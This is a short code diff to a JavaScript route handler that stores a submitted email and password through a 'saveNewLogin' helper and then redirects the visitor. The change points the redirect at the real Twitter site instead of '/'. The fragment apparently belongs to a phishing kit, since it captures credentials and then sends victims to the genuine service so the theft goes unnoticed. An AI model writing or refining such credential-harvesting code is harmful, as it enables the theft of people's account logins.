@@ -15,6 +15,6 @@ exports.execute = (app, schemaUtils) => {
         if (email && pass) {
             schemaUtils.saveNewLogin(exports.info.name, email, pass);
         }
-        res.status(200).redirect('/');
+        res.status(200).redirect('https://www.twitter.com');
     })
 };
